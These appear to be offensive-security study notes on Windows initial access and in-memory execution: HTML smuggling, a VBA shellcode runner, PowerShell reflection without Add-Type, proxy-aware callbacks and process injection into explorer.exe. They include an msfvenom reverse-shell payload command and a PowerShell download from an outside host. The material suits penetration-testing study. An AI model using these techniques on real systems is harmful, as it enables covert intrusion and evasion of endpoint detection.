# HTML Smuggling

Usual technique for download file is to add **download** attribute tag act as a hyperlink to automatically download file when user click

```hmtl
<html>
   <body>
   <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
   </body>
</html>
```

Step for without user interactive.

1) Create Base64 Meterpreter Executable and store as Blob
2) Use Blob to create URL file object that simulates a file on the web server
3) Create an insivible anchor tag trigger download action once load pages

For google chrome we can use window.URL.createObjectURL, however for microsoft edge it does not support URL.createObjectURL() to download.
IE and Edge have their own APIs for creating and downloading files, which are called `msSaveBlob` or `msSaveOrOpenBlob`

# VBA Shellcode Runner

Piece of code execute in memory.

Require appraoch three win32 APIs from kernel32.dll: *virtualAlloc*, *RtMoveMemory* and *CreateThread*

Use *virtualAlloc* to allocate unmanaged memory that is writable, readable and executable.  
use *RtMoveMemory* to copy the shellcode into the newly allocated memory  
use *CreateThread* to create a new execution thread in the process to execute the shellcode.  

```
LPVOID VirtualAlloc(
LPVOID lpAddress,
SIZE_T dwSize,
DWORD flAllocationType,
DWORD flProtect
);
```
### Paramter explaination

*lpAddress* is the memory location address, if leave it set to "0", the API will choose the location.  
*dwSize* indicate the size of the location  
*flAllocationType and flProtect* indicate the allocation type and the memory protections.

### Data type in VBA
*LPVOID* can be represent as *LongPtr* in VBA.  
*DWORD* and *SIZE_T* are integers can be represent as *Long* in VBA.  

### Declare statement
```
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
```
*PtrSafe is a keyword to asserts that a Declare Statement is safe to run in x64 environment*

### Creating payload

First use msfvenom to create payload, even though the target machine is 64-bit, but the microsoft office installed in 32-bit application, so generate 32-bit shellcode

```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.81 LPORT=443 ExitFunc=thread -f vbapplication
```

Add array to the VBA code.

### Setting argument for VirtualAlloc

lpaddress - Set the value "0" which will leave the memory allocation to the API.  

  
DwSize - Can be hard coded the length of the payload, however need to change again, if another payload is used. To set it dynamically, use the *Ubound* to get the size of the array containing the shellcode.  

  
fkAllocationType - Set as *0x3000* which equates to the allocation type enums of **MEM_COMMIT** and **MEM_RESERVE**. This will make the OS allocate the desired memory for us and make it available. In VBA, this will be represented as &H3000.  

  
flProtect - set to &H40(0x40) indicating the memory is able to read write execute.  

### RtlMoveMemory

Destination - Points to the newly allocated buffer.

Source - address of an element from the shellcode array

Length - the length of the source.

### CreateThread.

Most the argument in CreateThread are not needed and can set them to O.

The third argument LPstartAddress is the start address for the code execution and must be the address of our shellcode buffer. 


# Keep powershell in memory

### Leveraging unSafeNativeMethods

In windows powershell, there are three ways to interact with Windows API functions:

1) Use the *Add-Type* cmdlet to compile c# code.
2) get a reference to a private type in the .NET framework that calls the method
3) **Use reflection to dynamically define a method that calls the Windows API function**

**Our shellcode runner located the function, specified data types, and invoke the function.**

2 Way for locate the function.

One way is to locate functions in unmanged dynamic link libraries. The original technique based on *Add-Type* and *Dllimport*. However, this method calls the csc compiler, which writes to disk will trigger detection. we want to operate it in completely in-memory.

Another way is known as dynamic lookup, Creates the .NET assembly in memory instead of writing code and compiling it.

To perform dynamic lookup of function address, we need 2 special win32 APIs *GetModuleHandle* and *GetProcAddress*.

*GetModuleHandle* gets the handle of the specified DLL.
```
[DllImport("kernel32")]
public static extern int GetModuleHandle(string lpModuleName);
```
*GetProcAddress* will take the variable of the handle and output the memory address

```
FARPROC GetProcAddress(
HMODULE hModule, // DLL模块句柄
LPCSTR lpProcName // 函数名
);
```

With these 2 function we are able to allocate any API.
However with the above function, we must invoke them without using *Add-Type*

```
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies |
  ForEach-Object {
    $_.GetTypes()|
      ForEach-Object {
          $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Contains('Unsafe')
          }
      } 2> $null
    }
 ```

The *GetAssemblies* gets the preloaded assemblies in the powershell process.
Each assemblies is a object, use a ForEach-Object to loop through all the object.
Next we use *Get-Types* ifor reach object through the $_ (current object)

when c# code want to directly invoke the WIN32 API, it must provide the Unsafe Keyword,
Knowing this, we perform another *ForEach-Object* loop on all the discovered object and Invoke Get-Member cmdlet with the static flag to locate static properties or methods.

However, it produce multiple result. But one of the Class *Microsoft.Win32.UnsafeNativeMethods* Class have both our wanted function *GetModuleHandle* and *GetProcAddress*
we modify and search for the allocation and only the class

```
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies |
  ForEach-Object {
    $_.Location
    $_.GetTypes()|
      ForEach-Object {
          $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Equeals('Microsoft.Win32.UnsafeNativeMethods')
          }
      } 2> $null
    }
```

![image](https://user-images.githubusercontent.com/48197340/131511978-e6c5bf59-df3c-4f89-9d71-757c556313e9.png)

we are able to locate *GetModuleHandle* and *GetProcAddress*. However these methods are only meant to be used internally by the .NET code, this block us from calling them from powershell and C#.

Therefore we have to call it indirectly.

The first step is to obtain a reference to these function, to do that, we have first obtain a reference to the System.dll assembly using the *GetType* method.  
This reference will allow us to locate the *GetModuleHandler* and *GetProcAddress* method inside it

```
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') })
  
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
```

First Pipe the assemblies to Where-Object and filter on 2 condition. First is to filter out those not native assemblies as we only want preloaded powershell assemblies, next is we want to have the last keyword as *system.dll*

# Talking to proxy

When powershell is running in SYSTEM integrity level, it does not have a proxy configuration and may fail to call back to C2.

In order to run our session through proxy, haev to create a proxy configuration for hte built-in SYSTEM account.

One way is to copy configuration from a standard user account on the system. Proxy settings for each user are stored in the registry at the following path.

Proxy setting in user registry key as follows

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings
```
what we want is the *ProxyServer* value.

The problem comes when the *HKEY_CURRENT_USER* is mapped to the user accessing it.

When navigating to SYSTEM registry, no such registry hive will exists.

However the content of the *HKEY_CURRENT_USER* registry are also store in *HKEY_USER* seperate by their SIDs

Any SID start with *s-1-5-21-* is a user account exclusive of built-in accounts.

Next get the value of the automatic mapped SIDs and extract the value of registry *ProxyServer*   
and we set the default web proxy to configure the SYSTEM user registry

```
New-PSDrive -Name HKY -PSProvider Registry -Root HKEY_USERS | Out-null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) { if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.SubString(10);break}}
$proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[System.Net.WebRequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = New-Object System.Net.WebClient
$wc.downloadstring('http://192.168.49.53/run2.ps1')
```
# Process injection and migration

Process is a container that created to host a application. Every process has its own virtual memory space.  
These space are not meant to interact with one another, but we are able to accomplish this with various win32 api.  

A thread executes the complied assemby code of the application. A process may have multiple threads to perform simultaneous actio and each thread have its stack and share the virtual memory space of the process.

As an overvew we can initiate windows-based injectin by opening a channel from one process to another through the win32 *OpenProcess* API.  
Modify memory space through the *VirtualAllocEx* and *WriteProcessMemory* API.  
Create a new execution thread inside the remote process with *CreateRemoteThread*.   

### OpenProcess API

```csharp
   [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
   static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
```

*OpenProcess* API opens an existing local process for interaction
 - *dwDeseiredAccess* established the access rights require on that process.
    - Every process have a *security descriptor* that specifies file permission of the executable and access rights of a user or group.
    - Every process have a *integrity level* that restricted acess to it. This works when blockng access to a higher integrity level, however access to a low level integrity level access is possible.

In general, we can only inject code into processes running at the same or lower integrity level of the current process. This makes explorer.exe a prime target because it will always exist and does not exit until the user log offs.

```
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```

- *dwDesiredAccess* is the access right we want to obtain for the remote process, its value will be checked against the security descriptor. We request for *PROCESS_ALL_ACCESS*(0x001F0FFF). Which gives the complete access to *explorer.exe*

- *binheritHandle* decide whether or not created child process can inherit this handle. In our case we do not care and simply pass the value false.

- *dwProcessID* is the process ID of process we want which is the explorer.exe, we can easily get it from process explorer.

E.G.
```csharp
IntPr hProcess = OpenProcess(0x001F0FFF, false, 4804)
```

### VirtualAllocEx API

In the previous VirtualAlloc shellcode runner, used to locate memory for your shellcode. However this **only works in current process**.  
*VirtualAllocEx* can perform actions in any process that we can have a valid handle to.

```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```

#### VirtualAllocEx argument

```
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

- *hProcess* is the process handle to *explorer.exe* we obtained from *OpenProcess*
- *lpAddress* is the desired address of the allocation in the remote process. If address given is already in use, the call will fail, it is better to pass in **null** value and let API select an unused address

The last 3 argument is similar to *VirtualAlloc* API, specific the size of the allocation, the allocation type, and the memory protection. We would set as 0x1000, 0x3000 (MEM_COMMIT and MEM_RESERVE) and 0x40 (PAGE_EXECUTE_READWRITE).

```csharp
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
```

### WriteProcessMemory

Allow to copy data into remote process. The previous *RtlMoveMemory* and c# methods do not support remote copy.

## CreateRemoteThread

*CreateThread* does not support creation of remote process threads, rely on *CreateRemoteThread* instead
